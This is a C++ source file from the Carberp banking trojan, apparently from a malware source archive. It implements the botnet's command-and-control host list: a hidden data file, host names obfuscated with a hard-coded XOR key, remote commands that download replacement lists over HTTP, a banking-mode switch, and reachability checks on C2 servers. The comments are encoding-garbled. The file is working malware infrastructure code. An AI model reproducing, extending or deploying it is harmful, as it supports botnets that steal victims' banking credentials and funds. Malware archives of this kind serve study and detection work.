/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------


#pragma hdrstop

#include <WinSock.h>

#include "BotCore.h"

#include "BotHosts.h"
#include "Utils.h"

//---------------------------------------------------------------------------


//------------------------------------------------------
// ��������� ��� ������ � ������� ������
//------------------------------------------------------

#define HOST_FILE_SIGNATURE  0xFA5E87CD  /* ��������� ����� ������ */
#define HOST_BLOCK_SIGNATURE 0x2A8E87CA  /* ��������� ����� ����� */

#define HOST_FILE_VERSION   1           /* ������ ����� ������ */


// ������ ���������� ������
const static char HostCryptPassword[] = {'H', 'J', 'G', 's', 'd', 'l', 'k', '8', '7', '3', 'd',  0};

const static char HostsBankingModeSignal[] = {'h', 's', 't', 'b', 'm', 'l', 'd', '.', 's', 'g', 'l',  0};

const static char HostsBankingMode[]   = {'b', 'n', 'k', '.', 'l', 'i', 's', 't',  0};
const static char HostsNoBankingMode[] = {'n', 'o', 'b', 'n', 'k', '.', 'l', 'i', 's', 't',  0};


//------------------------------------------------------
// �������� ��������� ����� ������
//------------------------------------------------------
#pragma pack(push, 1)
typedef struct THostFileHeader
{
	DWORD Signature;   // ��������� �����
	DWORD Version;     // ������ �����
	DWORD Weight;      // ��� ������ � �����
	DWORD Count;       // ���������� ������ � �����
} *PHostFileHeader;
#pragma pack(pop)

//------------------------------------------------------
// �������� ��������� �����
//------------------------------------------------------
#pragma pack(push, 1)
typedef struct THostBlockHeader
{
	DWORD    Signature;   // ��������� �����
	DWORD    Hash;        // ��� �����
	DWORD    Status;      // ������ �����
	HOSTTIME CheckTime;   //  ����� ��������� ��������
	DWORD    Length;      // ����� �����
} *PHostBlockHeader;
#pragma pack(pop)

//---------------------------------------------------------------------------

//***************************************************************************
//  ������ ������ � ������ ������ ������
//***************************************************************************
namespace HostsReader
{

	bool ReadFileHeader(HANDLE File, PHostFileHeader H)
	{
		// ������� ������ ��������� �����
        DWORD Readed;
		pReadFile(File, H, sizeof(THostFileHeader), &Readed, NULL);
		if (Readed != sizeof(THostFileHeader))
			return false;

		// ��������� ��������� � ������ �����
		if (H->Signature != HOST_FILE_SIGNATURE || H->Version != HOST_FILE_VERSION)
		{
            ClearStruct(*H);
			return false;
		}
		return true;
	}
	//-----------------------------------------------------------------------

	bool ReadHostBlock(HANDLE File, PHostBlockHeader H, PCHAR *Host)
	{
		// ������� ������ ���� �����
        DWORD Readed;
		pReadFile(File, H, sizeof(THostBlockHeader), &Readed, NULL);
		if (Readed != sizeof(THostBlockHeader))
			return false;

		// ��������� ��������� �����
		if (H->Signature != HOST_BLOCK_SIGNATURE)
		{
			ClearStruct(*H);
			return false;
		}

		// ������ ������ �����
		if (Host != NULL)
		{
			*Host = STR::Alloc(H->Length);
			if (*Host == NULL)
				return false;

			pReadFile(File, *Host, H->Length, &Readed, NULL);
			if (Readed != H->Length)
			{
				STR::Free2(*Host);
				return false;
            }
		}

		return true;
	}
	//-----------------------------------------------------------------------
}



//****************************************************************************


PCHAR Hosts::GetFileName()
{
	// ������� ���������� ��� ����� ��������� ������ ������ ����
	const static char FileName[] = {'m', 'n', 'h', 's', 'l', 's', 't', '3', '2', '.', 'd', 'a', 't',  0};

	return BOT::GetWorkPathInSysDrive(NULL, (PCHAR)FileName);

}
//---------------------------------------------------------------------------

void FreeHostRecord(LPVOID Data)
{
	// ���������� ��������� �����
	if (Data == NULL)
		return;

	PHost Host = (PHost)Data;

	STR::Free(Host->Host);
    FreeStruct(Host);
}
//---------------------------------------------------------------------------

PHostList Hosts::CreateList()
{
	// ������� ������ ������ ������.
	PHostList L = CreateStruct(THostList);
	if (L == NULL)
		return NULL;

	L->Weight = HOSTS_WEIGHT_DEFAULT;

	L->Items = List::Create();
	List::SetFreeItemMehod(L->Items, FreeHostRecord);
	return L;
}
//---------------------------------------------------------------------------

void Hosts::FreeList(PHostList List)
{
	// ������� ���������� ������ ������
	if (List != NULL)
	{
		List::Free(List->Items);
		FreeStruct(List);
    }
}
//---------------------------------------------------------------------------

void Hosts::ClearList(PHostList List)
{
	//  ClearList - ������� ������� ������ ������
	if (List != NULL)
	{
		List->Weight = HOSTS_WEIGHT_DEFAULT;
		List::Clear(List->Items);
    }
}
//---------------------------------------------------------------------------

PHost Hosts::AddHost(PHostList List, PCHAR Host)
{
	//  �������� ����� ���� � ������
	if (List == NULL)
		return NULL;

	PHost Rec = CreateStruct(THost);
	List::Add(List->Items, Rec);

	if (!STR::IsEmpty(Host))
		Rec->Host = STR::New(Host);

	return Rec;
}
//---------------------------------------------------------------------------


PCHAR __EncodeHost(PCHAR Host)
{
	// ������� ������������� ������ �����
    PCHAR Result =STR::New(Host);
	XORCrypt::Crypt((PCHAR)HostCryptPassword, (LPBYTE)Result, StrCalcLength(Result));
	return Result;
}

PCHAR __DecodeHost(PCHAR Host)
{
	// ������� ������������� ������ �����
    PCHAR Result =STR::New(Host);
	XORCrypt::Crypt((PCHAR)HostCryptPassword, (LPBYTE)Result, StrCalcLength(Result));
	return Result;
}
//---------------------------------------------------------------------------



bool HostsDoWriteListToFile(HANDLE File, PHostList List)
{
	// ������� ���������� ������ ������ � �������� ����

	DWORD Writed = 0;

	// ���������� ��������� �����
	THostFileHeader H;
	ClearStruct(H);

	H.Signature = HOST_FILE_SIGNATURE;
	H.Version   = HOST_FILE_VERSION;
	H.Weight    = List->Weight;
	H.Count     = List::Count(List->Items);

	WriteFile(File, &H, sizeof(H), &Writed, NULL);
	if (Writed != sizeof(H))
		return false;

	// ���������� �������� ������
	for (DWORD i = 0; i < List::Count(List->Items); i++)
	{
		PHost Host = (PHost)List::GetItem(List->Items, i);
		if (Host == NULL || STR::IsEmpty(Host->Host))
			continue;


		// ���������� ��������� ����� �����
		THostBlockHeader Block;
		ClearStruct(Block);

		PCHAR TempHost = __EncodeHost(Host->Host);

		Block.Signature = HOST_BLOCK_SIGNATURE;
		Block.Hash      = CalcHash(Host->Host);
		Block.Status    = Host->Status;
        Block.CheckTime = Host->CheckTime;
		Block.Length    = StrCalcLength(TempHost);

		WriteFile(File, &Block, sizeof(Block), &Writed, NULL);
		if (Writed != sizeof(Block))
		{
			STR::Free(TempHost);
			return false;
        }

		// ���������� ����
		WriteFile(File, TempHost, Block.Length, &Writed, NULL);
		if (Writed != Block.Length)
		{
			STR::Free(TempHost);
			return false;
        }

        STR::Free(TempHost);
	}

	return true;
}
//---------------------------------------------------------------------------

bool HostsDoLoadListFromFile(HANDLE File, PHostList List)
{
	// ������� ��������� ������ ������ ������ �� �����


	// =================  ������ ��������� �����  ==================

	THostFileHeader H;
	if (!HostsReader::ReadFileHeader(File, &H))
		return false;

	List->Weight = H.Weight;

	// =================  ������ ����� ������  ==================

	for (DWORD i = 0; i < H.Count; i++)
	{
		// ������ ��������� �����
		THostBlockHeader Block;
		PCHAR Host;

		if (!HostsReader::ReadHostBlock(File, &Block, &Host))
			return false;

		PHost Rec  = CreateStruct(THost);
		if (Rec == NULL)
		{
			STR::Free(Host);
			return false;
		}

		// �������� ������ ��� ��������� �����
		Rec->Status    = Block.Status;
		Rec->CheckTime = Block.CheckTime;
		Rec->Host      = __DecodeHost(Host);

		STR::Free(Host);

		List::Add(List->Items, Rec);

	}

	return true;

}
//---------------------------------------------------------------------------

HANDLE OpenHostsFile(PCHAR FileName, DWORD AccessMode, DWORD ShareMode, DWORD CreationDisposition)
{
	// ������� ��������� ���� �� ������� ������
	// �������� �������� ����� ���� ������� ������ ����� ��� �����,
	// � ���� ������ ����� ��������� ������� �������� ����� �� ��� ���
	// ���� �� �� �����������

	if (STR::IsEmpty(FileName))
		return INVALID_HANDLE_VALUE;

	HANDLE File;

	do
	{
		File = (HANDLE)pCreateFileA(FileName, AccessMode, ShareMode, NULL, CreationDisposition, FILE_ATTRIBUTE_HIDDEN, NULL);

		if (File == INVALID_HANDLE_VALUE)
		{
			// � ������ ������ �������� ����� �� ������� ������
			// ������ ������� (���� � ������ ������ ������������)
			// ������� ��������� ����� � �������� ����� ������� ����.
			// � ��������� ������ ��������� ����
			if (pGetLastError() ==  ERROR_SHARING_VIOLATION)
				pSleep(50);
			else
				break;
        }
	}
	while (File == INVALID_HANDLE_VALUE);

	return File;
}
//---------------------------------------------------------------------------

bool Hosts::SaveListToFile(PHostList List, PCHAR FileName, bool IgnoreWeight)
{
	// ������� ��������� ������ ������ � ����
	if (List == NULL || STR::IsEmpty(FileName))
		return false;

	// ��������� ����.
	// ��� ��� ������ ������ ����� ������������ ������ �������� � ��������
	// ������������� ������

	DWORD Access = (IgnoreWeight) ? GENERIC_WRITE : GENERIC_ALL;

	HANDLE File = OpenHostsFile(FileName, Access, 0,  OPEN_ALWAYS);

	if (File == INVALID_HANDLE_VALUE)
		return false;


	// ��������� ��� ������ � �����
	if (!IgnoreWeight)
	{
		DWORD Weight;
		if ((GetListWeight(File, Weight) && Weight > List->Weight))
		{
			// � ������ ���� ��� ������ �� ����� ����, ��
			// ��������� ������
			pCloseHandle(File);
			return false;
		}
    }

    // �������� ����
	pSetFilePointer(File, 0, 0, FILE_BEGIN);
	pSetEndOfFile(File);

	// ���������� ������
    bool Result = HostsDoWriteListToFile(File, List);


	// ��������� ����
	pCloseHandle(File);

	return Result;
}
//---------------------------------------------------------------------------

bool Hosts::LoadListFromFile(PHostList List, PCHAR FileName)
{
   //	������� ��������� ������ ������ �� �����

   ClearList(List);

   HANDLE File = OpenHostsFile(FileName, GENERIC_READ, 0, OPEN_EXISTING);
   if (File == INVALID_HANDLE_VALUE)
	return false;

   bool Result = HostsDoLoadListFromFile(File, List);

   pCloseHandle(File);

   return Result;
}
//---------------------------------------------------------------------------

bool Hosts::GetListWeight(HANDLE File, DWORD &Weight)
{
	// ������� ���������� ��� ������ ����������� � ����
    Weight = 0;

    THostFileHeader H;
	if (HostsReader::ReadFileHeader(File, &H))
	{
		Weight = H.Weight;
		return true;
	}

	return false;
}
//---------------------------------------------------------------------------

bool Hosts::ExecuteUpdateHostsCommand(LPVOID TaskManager, PCHAR Command, PCHAR Args)
{
	// ������� ��������� ������� ���������� ������ ������
    return UpdateHosts(Args);
}
//---------------------------------------------------------------------------

PCHAR HostsGetBankingSignalFile()
{
	// ������� ���������� ������ ���� � ����� �������� � ������ ��������
	return BOT::GetWorkPath(NULL, (PCHAR)HostsBankingModeSignal);
}
//---------------------------------------------------------------------------

bool Hosts::UpdateHosts(PCHAR Args)
{

	//  ������� ��������� ������ ������ � ��������� ���� �� �����

	// ================ ��������� ������ ================

	LPVOID Buffer    = NULL;
	DWORD BufferSize = 0;
	bool BufferIsStr = false;

	bool IgnoreWeight = false;

	// ���������� ��� ���������
	// ������� 1: ������� ���������� � http://
	if (STR::GetHash(Args, 7, true) == 0x4E0F3408 /* http:// */)
	{
		// ��������� ���� �� ������� ������
		if (!HTTP::Get(Args, (PCHAR *)&Buffer, NULL))
			return false;

		BufferIsStr = true;
        BufferSize = STR::Length((PCHAR)Buffer);
	}
	else
	{
		// ������� 2: ������� �������� ��� �������
		// ��������� ������
		if (STR::IsEmpty(Args))
		{
			// ������ �� ������ ����������� ������
			PCHAR Signal = HostsGetBankingSignalFile();

			if (FileExistsA(Signal))
				Args = (PCHAR)HostsBankingMode;
            else
				Args = (PCHAR)HostsNoBankingMode;

            IgnoreWeight = true;

			STR::Free(Signal);
        }



		//Buffer = Plugin::Download(Args, NULL, &BufferSize, false);
	}

	// ================ ������������ ����������� ����� ================

	if (Buffer == NULL)
		return false;

    bool Result = false;

	// ��� ����� ������� ������ ������� �������� � ����������
	// ������ ����������� ����� ��������� �� ��������� ����,
	// �����, � ������ �������� �������� ������ �� ����,
	// ��������� ������ � ������� ����
	PCHAR TempFile = File::GetTempNameA();
	if (TempFile != NULL)
	{
        File::WriteBufferA(TempFile, Buffer, BufferSize);

		// ��������� ������
		PHostList List = CreateList();

		if (LoadListFromFile(List, TempFile))
		{
			// ��������� ����������� ������ � ������� ����
			PCHAR WorkFile = GetFileName();
			if (WorkFile != NULL)
			{
				Result = true;
                SaveListToFile(List, WorkFile, IgnoreWeight);

                STR::Free(WorkFile);
            }
        }


        // ���������� ������
        FreeList(List);

        pDeleteFileA(TempFile);
        STR::Free(TempFile);
    }



	// ����������� ������
	if (BufferIsStr)
		STR::Free((PCHAR)Buffer);
	else
		MemFree(Buffer);

	return Result;
}
//---------------------------------------------------------------------------

bool Hosts::GetActiveHostFormFile(PCHAR FileName, PCHAR &Host)
{
	//  ������� ���������� ������ ��������� ���� �� ��������� ������
	//  ������ �������� �� �����

	Host = NULL;

	bool FreeFileName = false;
	if (STR::IsEmpty(FileName))
	{
		FileName = GetFileName();
		FreeFileName = true;
	}
	if (FileName == NULL)
		return false;

    bool Result = false;

	PHostList List = CreateList();

	if (LoadListFromFile(List, FileName))
	{
		// ���������� ������ � ���� ������� ����
		for (DWORD i = 0; i < List::Count(List->Items); i++)
        {
			Result = true; // � ������ ���������� �����

			PHost H = (PHost)List::GetItem(List->Items, i);
			if (H == NULL || STR::IsEmpty(H->Host))
				continue;

			 if (CheckHost(H->Host))
			 {
				 Host = STR::New(H->Host);
				 break;
             }
		}
    }

    FreeList(List);


	if (FreeFileName)
		STR::Free(FileName);

	return Result;
}
//---------------------------------------------------------------------------


bool Hosts::CheckHost(PCHAR Host )
{
   // ������� ��������� ����������������� �����

   if (STR::IsEmpty(Host))
   	return false;

	WSADATA wsa;

	if ((int)pWSAStartup(MAKEWORD(2, 2), &wsa) != 0 )
		return false;

	bool ret = false;

	SOCKET Socket = ConnectToHost(Host, 80);

	if ( Socket != -1 )
		ret = true;

	pclosesocket( Socket );
	return ret;
}
//---------------------------------------------------------------------------

DWORD WINAPI BankingModeApdateHostsThread(LPVOID Data)
{
    Hosts::UpdateHosts(NULL);
	return 0;
}
//---------------------------------------------------------------------------

void Hosts::SetBankingMode()
{
	//  ������� �������� ������������� ������ ��� ������� �������
	//  ������� �������

	DWORD Flag = 1;
	bool Update = false;

	PCHAR FileName = HostsGetBankingSignalFile();

	if (!FileExistsA(FileName))
	{
		Update = true;
		File::WriteBufferA(FileName, &Flag, sizeof(Flag));
    }

	STR::Free(FileName);

	if (Update)
	    StartThread(BankingModeApdateHostsThread, NULL);
}
//---------------------------------------------------------------------------
